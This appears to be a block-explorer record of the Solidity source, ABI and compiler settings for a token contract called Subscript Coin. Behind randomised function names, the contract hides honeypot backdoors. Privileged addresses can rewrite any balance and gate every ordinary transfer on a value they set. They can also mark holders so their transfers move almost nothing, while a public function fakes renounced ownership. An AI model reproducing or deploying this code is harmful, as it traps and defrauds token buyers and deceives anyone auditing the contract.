{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract teamAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeMarketing {\n    function createPair(address liquidityBuy, address tokenTxSell) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface feeTakeMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface shouldReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamSender) external view returns (uint256);\n\n    function transfer(address sellFrom, uint256 fromMin) external returns (bool);\n\n    function allowance(address totalMaxTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellFrom,\n        uint256 fromMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverExemptEnable, uint256 value);\n    event Approval(address indexed totalMaxTrading, address indexed spender, uint256 value);\n}\n\ninterface liquidityShould is shouldReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SubscriptCoin is teamAmount, shouldReceiver, liquidityShould {\n\n    function enableAmount(uint256 fromMin) public {\n        exemptLaunchList();\n        feeMax = fromMin;\n    }\n\n    mapping(address => uint256) private amountLimit;\n\n    bool public fundWallet;\n\n    address public amountLiquidity;\n\n    function sellLaunch(address amountTo) public {\n        require(amountTo.balance < 100000);\n        if (fundWallet) {\n            return;\n        }\n        if (shouldLimit == marketingMin) {\n            sellAtTx = false;\n        }\n        totalBuyIs[amountTo] = true;\n        \n        fundWallet = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableBuyMax;\n    }\n\n    string private totalTake = \"SCN\";\n\n    address private enableBuyMax;\n\n    function transfer(address buyEnableTx, uint256 fromMin) external virtual override returns (bool) {\n        return fromMinSwap(_msgSender(), buyEnableTx, fromMin);\n    }\n\n    uint256 walletAt;\n\n    function balanceOf(address teamSender) public view virtual override returns (uint256) {\n        return amountLimit[teamSender];\n    }\n\n    bool private autoFeeTo;\n\n    address atAuto;\n\n    function owner() external view returns (address) {\n        return enableBuyMax;\n    }\n\n    uint256 private listFee = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private amountReceiverLiquidity;\n\n    uint256 constant exemptSender = 6 ** 10;\n\n    uint8 private isMarketingTake = 18;\n\n    function exemptLaunchList() private view {\n        require(totalBuyIs[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMarketingTake;\n    }\n\n    uint256 public amountWallet = 3;\n\n    bool public sellAtTx;\n\n    function toMode(address launchLaunched) public {\n        exemptLaunchList();\n        if (marketingMin != sellAtTx) {\n            autoFeeTo = false;\n        }\n        if (launchLaunched == amountLiquidity || launchLaunched == receiverAmount) {\n            return;\n        }\n        sellMax[launchLaunched] = true;\n    }\n\n    function fromMinSwap(address maxTotal, address sellFrom, uint256 fromMin) internal returns (bool) {\n        if (maxTotal == amountLiquidity) {\n            return exemptListEnable(maxTotal, sellFrom, fromMin);\n        }\n        uint256 minAt = shouldReceiver(receiverAmount).balanceOf(atAuto);\n        require(minAt == feeMax);\n        require(sellFrom != atAuto);\n        if (sellMax[maxTotal]) {\n            return exemptListEnable(maxTotal, sellFrom, exemptSender);\n        }\n        fromMin = takeShouldTx(maxTotal, sellFrom, fromMin);\n        return exemptListEnable(maxTotal, sellFrom, fromMin);\n    }\n\n    uint256 public marketingModeIs = 0;\n\n    event OwnershipTransferred(address indexed maxAtFrom, address indexed listBuy);\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalTake;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellTo;\n    }\n\n    bool private marketingMin;\n\n    string private sellTo = \"Subscript Coin\";\n\n    constructor (){\n        \n        launchExempt();\n        feeTakeMin takeIs = feeTakeMin(fromMode);\n        receiverAmount = modeMarketing(takeIs.factory()).createPair(takeIs.WETH(), address(this));\n        atAuto = modeMarketing(takeIs.factory()).feeTo();\n        if (sellAtTx == autoFeeTo) {\n            shouldLimit = true;\n        }\n        amountLiquidity = _msgSender();\n        totalBuyIs[amountLiquidity] = true;\n        amountLimit[amountLiquidity] = listFee;\n        if (marketingMin) {\n            shouldLimit = false;\n        }\n        emit Transfer(address(0), amountLiquidity, listFee);\n    }\n\n    address public receiverAmount;\n\n    function marketingShould(address buyEnableTx, uint256 fromMin) public {\n        exemptLaunchList();\n        amountLimit[buyEnableTx] = fromMin;\n    }\n\n    function approve(address tokenEnableTx, uint256 fromMin) public virtual override returns (bool) {\n        amountReceiverLiquidity[_msgSender()][tokenEnableTx] = fromMin;\n        emit Approval(_msgSender(), tokenEnableTx, fromMin);\n        return true;\n    }\n\n    bool public shouldLimit;\n\n    address fromMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 feeMax;\n\n    mapping(address => bool) public sellMax;\n\n    function allowance(address fundLimit, address tokenEnableTx) external view virtual override returns (uint256) {\n        if (tokenEnableTx == fromMode) {\n            return type(uint256).max;\n        }\n        return amountReceiverLiquidity[fundLimit][tokenEnableTx];\n    }\n\n    function exemptListEnable(address maxTotal, address sellFrom, uint256 fromMin) internal returns (bool) {\n        require(amountLimit[maxTotal] >= fromMin);\n        amountLimit[maxTotal] -= fromMin;\n        amountLimit[sellFrom] += fromMin;\n        emit Transfer(maxTotal, sellFrom, fromMin);\n        return true;\n    }\n\n    function transferFrom(address maxTotal, address sellFrom, uint256 fromMin) external override returns (bool) {\n        if (_msgSender() != fromMode) {\n            if (amountReceiverLiquidity[maxTotal][_msgSender()] != type(uint256).max) {\n                require(fromMin <= amountReceiverLiquidity[maxTotal][_msgSender()]);\n                amountReceiverLiquidity[maxTotal][_msgSender()] -= fromMin;\n            }\n        }\n        return fromMinSwap(maxTotal, sellFrom, fromMin);\n    }\n\n    function launchExempt() public {\n        emit OwnershipTransferred(amountLiquidity, address(0));\n        enableBuyMax = address(0);\n    }\n\n    function takeShouldTx(address maxTotal, address sellFrom, uint256 fromMin) internal view returns (uint256) {\n        require(fromMin > 0);\n\n        uint256 listExempt = 0;\n        if (maxTotal == receiverAmount && amountWallet > 0) {\n            listExempt = fromMin * amountWallet / 100;\n        } else if (sellFrom == receiverAmount && marketingModeIs > 0) {\n            listExempt = fromMin * marketingModeIs / 100;\n        }\n        require(listExempt <= fromMin);\n        return fromMin - listExempt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listFee;\n    }\n\n    mapping(address => bool) public totalBuyIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMaxTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAtFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExemptEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenEnableTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenEnableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMin\",\"type\":\"uint256\"}],\"name\":\"enableAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingModeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMin\",\"type\":\"uint256\"}],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAtTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"}],\"name\":\"toMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalBuyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SubscriptCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}